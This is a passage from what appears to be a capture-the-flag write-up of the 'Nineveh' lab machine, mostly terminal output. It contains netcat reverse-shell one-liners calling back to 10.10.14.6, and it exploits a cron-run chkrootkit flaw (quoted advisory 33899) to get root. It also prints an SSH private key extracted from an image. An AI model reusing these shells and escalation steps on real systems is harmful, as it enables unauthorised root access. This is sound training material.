[kworker/u2:30]
[bioset]
[bioset]
[kworker/u2:32]
[kworker/0:1H]
[raid5wq]
[bioset]
[jbd2/sda1-8]
[ext4-rsv-conver]
/usr/sbin/apache2 -k start
/lib/systemd/systemd-journald
[kauditd]
[iscsi_eh]
[ib_addr]
[ib_mcast]
[ib_nl_sa_wq]
[ib_cm]
[iw_cm_wq]
[rdma_cm]
/sbin/lvmetad -f
/lib/systemd/systemd-udevd
/lib/systemd/systemd-timesyncd
/sbin/iscsid
/sbin/iscsid
/usr/lib/snapd/snapd
/usr/sbin/atd -f
/usr/sbin/cron -f
/usr/lib/accountsservice/accounts-daemon
/usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
/usr/sbin/sshd -D
/usr/sbin/acpid
/usr/bin/lxcfs /var/lib/lxcfs/
/usr/sbin/rsyslogd -n
/usr/bin/vmtoolsd
/lib/systemd/systemd-logind
/usr/lib/policykit-1/polkitd --no-debug
/sbin/agetty --noclear tty1 linux
/usr/sbin/knockd -d -i ens33
/sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
/usr/sbin/apache2 -k start
sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 8090 >/tmp/f
cat /tmp/f
/bin/sh -i
nc 10.10.14.6 8090
/usr/sbin/apache2 -k start
python3 -c import pty; pty.spawn("/bin/bash")
/bin/bash
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
[kworker/0:1]
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
[kworker/0:2]
ps -eo command
www-data@nineveh:/report$
```

```sh
www-data@nineveh:/report$ IFS=$'\n'
www-data@nineveh:/report$ for i in $(ps -eo command); do echo $i; done
COMMAND
/sbin/init
[kthreadd]
[ksoftirqd/0]
[kworker/0:0H]
[rcu_sched]
[rcu_bh]
[migration/0]
[watchdog/0]
[kdevtmpfs]
[netns]
[perf]
[khungtaskd]
[writeback]
[ksmd]
[khugepaged]
[crypto]
[kintegrityd]
[bioset]
[kblockd]
[ata_sff]
[md]
[devfreq_wq]
[kswapd0]
[vmstat]
[fsnotify_mark]
[ecryptfs-kthrea]
[kthrotld]
[acpi_thermal_pm]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[scsi_eh_0]
[scsi_tmf_0]
[scsi_eh_1]
[scsi_tmf_1]
[ipv6_addrconf]
[deferwq]
[charger_manager]
[kpsmoused]
[ttm_swap]
[scsi_eh_2]
[scsi_tmf_2]
[scsi_eh_3]
[scsi_tmf_3]
[scsi_eh_4]
[scsi_tmf_4]
[scsi_eh_5]
[scsi_tmf_5]
[scsi_eh_6]
[scsi_tmf_6]
[scsi_eh_7]
[scsi_tmf_7]
[scsi_eh_8]
[scsi_tmf_8]
[scsi_eh_9]
[scsi_tmf_9]
[scsi_eh_10]
[scsi_tmf_10]
[scsi_eh_11]
[scsi_tmf_11]
[scsi_eh_12]
[scsi_tmf_12]
[scsi_eh_13]
[scsi_tmf_13]
[scsi_eh_14]
[scsi_tmf_14]
[scsi_eh_15]
[scsi_tmf_15]
[scsi_eh_16]
[scsi_tmf_16]
[scsi_eh_17]
[scsi_tmf_17]
[scsi_eh_18]
[scsi_tmf_18]
[scsi_eh_19]
[scsi_tmf_19]
[scsi_eh_20]
[scsi_tmf_20]
[scsi_eh_21]
[scsi_tmf_21]
[scsi_eh_22]
[scsi_tmf_22]
[scsi_eh_23]
[scsi_tmf_23]
[scsi_eh_24]
[scsi_tmf_24]
[scsi_eh_25]
[scsi_tmf_25]
[scsi_eh_26]
[scsi_tmf_26]
[scsi_eh_27]
[scsi_tmf_27]
[scsi_eh_28]
[scsi_tmf_28]
[scsi_eh_29]
[scsi_tmf_29]
[scsi_eh_30]
[scsi_tmf_30]
[scsi_eh_31]
[scsi_tmf_31]
[kworker/u2:30]
[bioset]
[bioset]
[kworker/u2:32]
[kworker/0:1H]
[raid5wq]
[bioset]
[jbd2/sda1-8]
[ext4-rsv-conver]
/usr/sbin/apache2 -k start
/lib/systemd/systemd-journald
[kauditd]
[iscsi_eh]
[ib_addr]
[ib_mcast]
[ib_nl_sa_wq]
[ib_cm]
[iw_cm_wq]
[rdma_cm]
/sbin/lvmetad -f
/lib/systemd/systemd-udevd
/lib/systemd/systemd-timesyncd
/sbin/iscsid
/sbin/iscsid
/usr/lib/snapd/snapd
/usr/sbin/atd -f
/usr/sbin/cron -f
/usr/lib/accountsservice/accounts-daemon
/usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
/usr/sbin/sshd -D
/usr/sbin/acpid
/usr/bin/lxcfs /var/lib/lxcfs/
/usr/sbin/rsyslogd -n
/usr/bin/vmtoolsd
/lib/systemd/systemd-logind
/usr/lib/policykit-1/polkitd --no-debug
/sbin/agetty --noclear tty1 linux
/usr/sbin/knockd -d -i ens33
/sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
/usr/sbin/apache2 -k start
sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 8090 >/tmp/f
cat /tmp/f
/bin/sh -i
nc 10.10.14.6 8090
/usr/sbin/apache2 -k start
python3 -c import pty; pty.spawn("/bin/bash")
/bin/bash
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
[kworker/0:1]
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
/usr/sbin/apache2 -k start
[kworker/0:2]
ps -eo command
www-data@nineveh:/report$
```

```sh
www-data@nineveh:/report$ cd /var/tmp/
www-data@nineveh:/var/tmp$ ls
ninevehNotes.php								   systemd-private-d38f74fa79734a34ae94568632ebca6b-systemd-timesyncd.service-ajEHpL
systemd-private-384cb10c9b4645d6aac4de494d2d8152-systemd-timesyncd.service-XqmrFz  systemd-private-f7668f1ec7794b21be811ed2659f129b-systemd-timesyncd.service-9OBL8h
```

```sh
www-data@nineveh:/var/tmp$ vi procmon.sh
www-data@nineveh:/var/tmp$ cat procmon.sh
#!/bin/bash

# Loop by line
IFS=$'\n'

old_process=$(ps -eo command)

while true;
do
   new_process=$(ps -eo command)
   diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
   sleep 1
   old_process=$new_process
done
www-data@nineveh:/var/tmp$ chmod +x procmon.sh
www-data@nineveh:/var/tmp$ ./procmon.sh
< ps -eo command
> /usr/sbin/CRON -f
> /bin/sh -c /root/vulnScan.sh
> /bin/bash /root/vulnScan.sh
> /bin/sh /usr/bin/chkrootkit
> ps -eo command
< /usr/sbin/CRON -f
< /bin/sh -c /root/vulnScan.sh
< /bin/bash /root/vulnScan.sh
< /bin/sh /usr/bin/chkrootkit
< ps -eo command
> ps -eo command
> /usr/sbin/CRON -f
> /bin/sh -c /root/vulnScan.sh
> /bin/bash /root/vulnScan.sh
> /bin/sh /usr/bin/chkrootkit
< ps -eo command
> ps -eo command
< /usr/sbin/CRON -f
< /bin/sh -c /root/vulnScan.sh
< /bin/bash /root/vulnScan.sh
< /bin/sh /usr/bin/chkrootkit
```

```sh
root@kali:~/nineveh# searchsploit chkrootkit

-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------
 Exploit Title                                                                                                                                                      |  Path
                                                                                                                                                                    | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                                                                                                                | exploits/linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                                                                                                        | exploits/linux/local/33899.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------
Shellcodes: No Result
root@kali:~/nineveh#
```

```33899.txt```

```sh
We just found a serious vulnerability in the chkrootkit package, which
may allow local attackers to gain root access to a box in certain
configurations (/tmp not mounted noexec).

The vulnerability is located in the function slapper() in the
shellscript chkrootkit:

#
# SLAPPER.{A,B,C,D} and the multi-platform variant
#
slapper (){
   SLAPPER_FILES="${ROOTDIR}tmp/.bugtraq ${ROOTDIR}tmp/.bugtraq.c"
   SLAPPER_FILES="$SLAPPER_FILES ${ROOTDIR}tmp/.unlock ${ROOTDIR}tmp/httpd \
   ${ROOTDIR}tmp/update ${ROOTDIR}tmp/.cinik ${ROOTDIR}tmp/.b"a
   SLAPPER_PORT="0.0:2002 |0.0:4156 |0.0:1978 |0.0:1812 |0.0:2015 "
   OPT=-an
   STATUS=0
   file_port=

   if ${netstat} "${OPT}"|${egrep} "^tcp"|${egrep} "${SLAPPER_PORT}">
/dev/null 2>&1
      then
      STATUS=1
      [ "$SYSTEM" = "Linux" ] && file_port=`netstat -p ${OPT} | \
         $egrep ^tcp|$egrep "${SLAPPER_PORT}" | ${awk} '{ print  $7 }' |
tr -d :`
   fi
   for i in ${SLAPPER_FILES}; do
      if [ -f ${i} ]; then
         file_port=$file_port $i
         STATUS=1
      fi
   done
   if [ ${STATUS} -eq 1 ] ;then
      echo "Warning: Possible Slapper Worm installed ($file_port)"
   else
      if [ "${QUIET}" != "t" ]; then echo "not infected"; fi
         return ${NOT_INFECTED}
   fi
}


The line 'file_port=$file_port $i' will execute all files specified in
$SLAPPER_FILES as the user chkrootkit is running (usually root), if
$file_port is empty, because of missing quotation marks around the
variable assignment.

Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.

If an attacker knows you are periodically running chkrootkit (like in
cron.daily) and has write access to /tmp (not mounted noexec), he may
easily take advantage of this.


Suggested fix: Put quotation marks around the assignment.

file_port="$file_port $i"


I will also try to contact upstream, although the latest version of
chkrootkit dates back to 2009 - will have to see, if I reach a dev there.
```

```sh
www-data@nineveh:/var/tmp$ cd /tmp/
www-data@nineveh:/tmp$ ls -l
total 8
prw-r--r-- 1 www-data www-data    0 Jan 26 03:00 f
drwx------ 3 root     root     4096 Jan 25 14:23 systemd-private-384cb10c9b4645d6aac4de494d2d8152-systemd-timesyncd.service-aUCcFS
drwx------ 2 root     root     4096 Jan 25 14:23 vmware-root
www-data@nineveh:/tmp$ cat update
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1234 >/tmp/f
www-data@nineveh:/tmp$ sed 's/tmp\/f/tmp\/i/g' update -i
www-data@nineveh:/tmp$ cat update
#!/bin/bash

rm /tmp/i;mkfifo /tmp/i;cat /tmp/i|/bin/sh -i 2>&1|nc 10.10.14.6 1234 >/tmp/i
www-data@nineveh:/tmp$
www-data@nineveh:/tmp$ chmod +x update
www-data@nineveh:/tmp$ cd /var/tmp/
www-data@nineveh:/var/tmp$ ./procmon.sh
> /usr/sbin/CRON -f
> /bin/sh -c /root/vulnScan.sh
> /bin/bash /root/vulnScan.sh
> /bin/sh /usr/bin/chkrootkit
> /bin/bash /tmp/update
> cat /tmp/i
> /bin/sh -i
> nc 10.10.14.6 1234
```

```sh
root@kali:~/nineveh# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.43] 47148
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
root.txt
vulnScan.sh
#
```

###### Privilege Escalation using knockd

```
https://10.10.10.43/secure_notes
```

![](images/26.png)

![](images/27.png)

```sh
root@kali:~/nineveh# ls -l
total 3020
-rw-r--r--  1 root root     440 Jan 26 03:02 cheat.txt
-rw-r--r--  1 root root  115384 Jan 26 02:18 hydra.restore
drwxr-xr-x  3 root root    4096 Jan 26 03:24 LinEnum
-rw-r--r--  1 root root     389 Jan 26 01:22 nineveh.nmap.gnmap
-rw-r--r--  1 root root     949 Jan 26 01:22 nineveh.nmap.nmap
-rw-r--r--  1 root root    9399 Jan 26 01:22 nineveh.nmap.xml
-rw-r--r--  1 root root 2891984 Jan 26 04:19 nineveh.png
-rw-r--r--  1 root root      40 Jan 26 02:54 php-onelineshell.php
-rw-r--r--  1 root root   37672 Jan 26 02:39 pw
drwxr-xr-x 11 root root    4096 Jan 26 01:54 SecLists
root@kali:~/nineveh#
```

```sh
root@kali:~/nineveh# binwalk -Me nineveh.png

Scan Time:     2018-01-26 04:22:17
Target File:   /root/nineveh/nineveh.png
MD5 Checksum:  353b8f5a4578e4472c686b6e1f15c808
Signatures:    344

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)


Scan Time:     2018-01-26 04:22:17
Target File:   /root/nineveh/_nineveh.png.extracted/54
MD5 Checksum:  d41d8cd98f00b204e9800998ecf8427e
Signatures:    344

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------


Scan Time:     2018-01-26 04:22:17
Target File:   /root/nineveh/_nineveh.png.extracted/secret/nineveh.pub
MD5 Checksum:  6b60618d207ad97e76664174e805cfda
Signatures:    344

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             OpenSSH RSA public key


Scan Time:     2018-01-26 04:22:17
Target File:   /root/nineveh/_nineveh.png.extracted/secret/nineveh.priv
MD5 Checksum:  f426d661f94b16292efc810ebb7ea305
Signatures:    344

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PEM RSA private key
99            0x63            Unix path: /Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU

root@kali:~/nineveh#
```

```sh
root@kali:~/nineveh# ls -l
total 3024
-rw-r--r--  1 root root     440 Jan 26 03:02 cheat.txt
-rw-r--r--  1 root root  115384 Jan 26 02:18 hydra.restore
drwxr-xr-x  3 root root    4096 Jan 26 03:24 LinEnum
-rw-r--r--  1 root root     389 Jan 26 01:22 nineveh.nmap.gnmap
-rw-r--r--  1 root root     949 Jan 26 01:22 nineveh.nmap.nmap
-rw-r--r--  1 root root    9399 Jan 26 01:22 nineveh.nmap.xml
-rw-r--r--  1 root root 2891984 Jan 26 04:19 nineveh.png
drwxr-xr-x  3 root root    4096 Jan 26 04:22 _nineveh.png.extracted
-rw-r--r--  1 root root      40 Jan 26 02:54 php-onelineshell.php
-rw-r--r--  1 root root   37672 Jan 26 02:39 pw
drwxr-xr-x 11 root root    4096 Jan 26 01:54 SecLists
root@kali:~/nineveh#
root@kali:~/nineveh# cd _nineveh.png.extracted/
root@kali:~/nineveh/_nineveh.png.extracted# ls -l
total 2844
-rw-r--r-- 1 root     root       10240 Jan 26 04:22 2BF8D0.tar
-rw-r--r-- 1 root     root           0 Jan 26 04:22 54
-rw-r--r-- 1 root     root     2891900 Jan 26 04:22 54.zlib
drwxr-xr-x 3 www-data www-data    4096 Jan 26 04:22 secret
root@kali:~/nineveh/_nineveh.png.extracted# cd secret/
root@kali:~/nineveh/_nineveh.png.extracted/secret# ls -l
total 12
-rw------- 1 www-data www-data 1675 Jul  1  2017 nineveh.priv
drwxr-xr-x 2 root     root     4096 Jan 26 04:22 _nineveh.priv.extracted
-rw-r--r-- 1 www-data www-data  400 Jul  1  2017 nineveh.pub
root@kali:~/nineveh/_nineveh.png.extracted/secret# cat nineveh.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
root@kali:~/nineveh/_nineveh.png.extracted/secret# cat nineveh.priv
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
root@kali:~/nineveh/_nineveh.png.extracted/secret#
```

```sh
root@kali:~/nineveh/_nineveh.png.extracted/secret# chmod 600 nineveh.priv
root@kali:~/nineveh/_nineveh.png.extracted/secret# ssh -i nineveh.priv amrois@10.10.10.43
ssh: connect to host 10.10.10.43 port 22: Connection timed out
root@kali:~/nineveh/_nineveh.png.extracted/secret#
```

```sh
www-data@nineveh:/$ netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -
tcp        0   1477 10.10.10.43:443         10.10.14.6:36718        ESTABLISHED -
tcp        0     51 10.10.10.43:443         10.10.14.6:36712        ESTABLISHED -
tcp        0     32 10.10.10.43:443         10.10.14.6:36708        LAST_ACK    -
tcp        0    282 10.10.10.43:38948       10.10.14.6:8090         ESTABLISHED 2414/nc
tcp        0      0 10.10.10.43:443         10.10.14.6:36724        SYN_RECV    -
tcp        0      0 10.10.10.43:47148       10.10.14.6:1234         ESTABLISHED -
tcp        0   1477 10.10.10.43:443         10.10.14.6:36716        ESTABLISHED -
tcp        0      0 10.10.10.43:443         10.10.14.6:36728        SYN_RECV    -
tcp        0   1477 10.10.10.43:443         10.10.14.6:36722        ESTABLISHED -
tcp        0     32 10.10.10.43:443         10.10.14.6:36704        LAST_ACK    -
tcp        0      0 10.10.10.43:443         10.10.14.6:36726        SYN_RECV    -
tcp        0     51 10.10.10.43:443         10.10.14.6:36714        ESTABLISHED -
tcp        0    502 10.10.10.43:443         10.10.14.6:36710        ESTABLISHED -
tcp        0   1477 10.10.10.43:443         10.10.14.6:36720        ESTABLISHED -
tcp        0     32 10.10.10.43:443         10.10.14.6:36706        LAST_ACK    -
tcp6       0      0 :::22                   :::*                    LISTEN      -
www-data@nineveh:/$
```

```sh
www-data@nineveh:/$ cd /etc/iptables/
www-data@nineveh:/etc/iptables$ ls -l
total 8
-rw-r--r-- 1 root root 408 Jul  2  2017 rules.v4
-rw-r--r-- 1 root root 183 Jul  2  2017 rules.v6
www-data@nineveh:/etc/iptables$ cat rules.v4
# Generated by iptables-save v1.6.0 on Sun Jul  2 19:37:15 2017
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [140:21895]
-A INPUT -p icmp -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 443 -j ACCEPT
-A INPUT -j DROP
COMMIT
# Completed on Sun Jul  2 19:37:15 2017
www-data@nineveh:/etc/iptables$
www-data@nineveh:/etc/iptables$ iptables -L
iptables v1.6.0: can't initialize iptables table `filter': Permission denied (you must be root)
Perhaps iptables or your kernel needs to be upgraded.
www-data@nineveh:/etc/iptables$
```

```sh
www-data@nineveh:/etc/iptables$ cd /etc/init.d/
www-data@nineveh:/etc/init.d$ ls -l
total 304
-rw-r--r-- 1 root root 2427 Jan 19  2016 README
-rwxr-xr-x 1 root root 2243 Feb  9  2016 acpid
-rwxr-xr-x 1 root root 2210 Apr  5  2016 apache-htcacheclean
-rwxr-xr-x 1 root root 8087 Apr  5  2016 apache2
-rwxr-xr-x 1 root root 6250 Oct  4  2016 apparmor
-rwxr-xr-x 1 root root 2799 Mar 31  2016 apport
-rwxr-xr-x 1 root root 1071 Dec  6  2015 atd
-rwxr-xr-x 1 root root 1275 Jan 19  2016 bootmisc.sh
-rwxr-xr-x 1 root root 3807 Jan 19  2016 checkfs.sh
-rwxr-xr-x 1 root root 1098 Jan 19  2016 checkroot-bootclean.sh
-rwxr-xr-x 1 root root 9353 Jan 19  2016 checkroot.sh
-rwxr-xr-x 1 root root 1343 Apr  4  2016 console-setup
-rwxr-xr-x 1 root root 3049 Apr  5  2016 cron
-rwxr-xr-x 1 root root  937 Mar 28  2015 cryptdisks
-rwxr-xr-x 1 root root  896 Mar 28  2015 cryptdisks-early
-rwxr-xr-x 1 root root 2813 Dec  1  2015 dbus
-rwxr-xr-x 1 root root 1105 Mar 15  2016 grub-common
-rwxr-xr-x 1 root root 1336 Jan 19  2016 halt
-rwxr-xr-x 1 root root 1423 Jan 19  2016 hostname.sh
-rwxr-xr-x 1 root root 3809 Mar 12  2016 hwclock.sh
-rwxr-xr-x 1 root root 2372 Apr 11  2016 irqbalance
-rwxr-xr-x 1 root root 1503 Mar 29  2016 iscsid
-rwxr-xr-x 1 root root 1804 Apr  4  2016 keyboard-setup
-rwxr-xr-x 1 root root 1300 Jan 19  2016 killprocs
-rwxr-xr-x 1 root root 2087 Dec 20  2015 kmod
-rwxr-xr-x 1 root root 1572 Mar 25  2009 knockd
-rwxr-xr-x 1 root root  695 Oct 30  2015 lvm2
-rwxr-xr-x 1 root root  571 Oct 30  2015 lvm2-lvmetad
-rwxr-xr-x 1 root root  586 Oct 30  2015 lvm2-lvmpolld
-rwxr-xr-x 1 root root 2300 Feb  3  2017 lxcfs
-rwxr-xr-x 1 root root 2541 Feb  3  2017 lxd
-rwxr-xr-x 1 root root 2611 Apr 11  2016 mdadm
-rwxr-xr-x 1 root root 1199 Jul 16  2014 mdadm-waitidle
-rwxr-xr-x 1 root root  703 Jan 19  2016 mountall-bootclean.sh
-rwxr-xr-x 1 root root 2301 Jan 19  2016 mountall.sh
-rwxr-xr-x 1 root root 1461 Jan 19  2016 mountdevsubfs.sh
-rwxr-xr-x 1 root root 1564 Jan 19  2016 mountkernfs.sh
-rwxr-xr-x 1 root root  711 Jan 19  2016 mountnfs-bootclean.sh
-rwxr-xr-x 1 root root 2456 Jan 19  2016 mountnfs.sh
-rwxr-xr-x 1 root root 1364 Jan  2  2016 netfilter-persistent
-rwxr-xr-x 1 root root 4771 Jul 19  2015 networking
-rwxr-xr-x 1 root root 1581 Oct 15  2015 ondemand
-rwxr-xr-x 1 root root 2503 Mar 29  2016 open-iscsi
-rwxr-xr-x 1 root root 1578 Sep 18  2016 open-vm-tools
-rwxr-xr-x 1 root root 1366 Nov 15  2015 plymouth
-rwxr-xr-x 1 root root  752 Nov 15  2015 plymouth-log
-rwxr-xr-x 1 root root 1192 Sep  6  2015 procps
-rwxr-xr-x 1 root root 6366 Jan 19  2016 rc
-rwxr-xr-x 1 root root  820 Jan 19  2016 rc.local
-rwxr-xr-x 1 root root  117 Jan 19  2016 rcS
-rwxr-xr-x 1 root root  661 Jan 19  2016 reboot
-rwxr-xr-x 1 root root 4149 Nov 23  2015 resolvconf
-rwxr-xr-x 1 root root 4355 Jul 10  2014 rsync
-rwxr-xr-x 1 root root 2796 Feb  3  2016 rsyslog
-rwxr-xr-x 1 root root 1226 Jun  9  2015 screen-cleanup
-rwxr-xr-x 1 root root 3927 Jan 19  2016 sendsigs
-rwxr-xr-x 1 root root  597 Jan 19  2016 single
-rw-r--r-- 1 root root 1087 Jan 19  2016 skeleton
-rwxr-xr-x 1 root root 4077 Mar 16  2017 ssh
-rwxr-xr-x 1 root root 6087 Apr 12  2016 udev
-rwxr-xr-x 1 root root 2049 Aug  7  2014 ufw
-rwxr-xr-x 1 root root 2737 Jan 19  2016 umountfs
-rwxr-xr-x 1 root root 2202 Jan 19  2016 umountnfs.sh
-rwxr-xr-x 1 root root 1879 Jan 19  2016 umountroot
-rwxr-xr-x 1 root root 1379 Feb 18  2016 unattended-upgrades
-rwxr-xr-x 1 root root 3111 Jan 19  2016 urandom
-rwxr-xr-x 1 root root 1306 Dec 16  2016 uuidd
www-data@nineveh:/etc/init.d$
```

```sh
www-data@nineveh:/etc/init.d$ cat knockd
#! /bin/sh

### BEGIN INIT INFO
# Provides:          knockd
# Required-Start:    $network $syslog
# Required-Stop:     $network $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: port-knock daemon
### END INIT INFO

PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
DAEMON=/usr/sbin/knockd
NAME=knockd
PIDFILE=/var/run/$NAME.pid
DEFAULTS_FILE=/etc/default/knockd
DESC="Port-knock daemon"
OPTIONS=" -d"

umask 0037

test -f $DAEMON || exit 0

set -e

[ -f $DEFAULTS_FILE ] && . $DEFAULTS_FILE

. /lib/lsb/init-functions

[ "$KNOCKD_OPTS" ] && OPTIONS="$OPTIONS $KNOCKD_OPTS"

start_if_configured() {
	if [ $START_KNOCKD -ne 1 ]; then
                log_warning_msg "$NAME disabled: not starting. To enable it edit $DEFAULTS_FILE"
                exit 0
	else
		log_daemon_msg "Starting $DESC" "$NAME"
		if ! START_ERROR=`start-stop-daemon --start --oknodo --quiet --exec $DAEMON -- $OPTIONS 2>&1`; then
			# don't fail the upgrade if it fails to start
			echo -n " "
			log_action_end_msg 1 "$START_ERROR"
			exit 0
		else
			log_end_msg 0
		fi
        fi
}

case "$1" in
  start)
	start_if_configured
	;;
  stop)
	log_daemon_msg "Stopping $DESC" "$NAME"
	start-stop-daemon --stop --oknodo --quiet --exec $DAEMON
	log_end_msg 0
	;;
  restart|reload|force-reload)
	log_daemon_msg "Stopping $DESC" "$NAME"
	start-stop-daemon --stop --oknodo --quiet --exec $DAEMON
	log_end_msg 0
	sleep 1
	start_if_configured
	;;
  *)
        log_warning_msg "Usage: $0 {start|stop|restart|reload|force-reload}" >&2
	exit 1
	;;
esac

exit 0
www-data@nineveh:/etc/init.d$
```

```sh
www-data@nineveh:/etc/init.d$ cat /etc/default/knockd
################################################
#
# knockd's default file, for generic sys config
#
################################################

# control if we start knockd at init or not
# 1 = start
# anything else = don't start
#
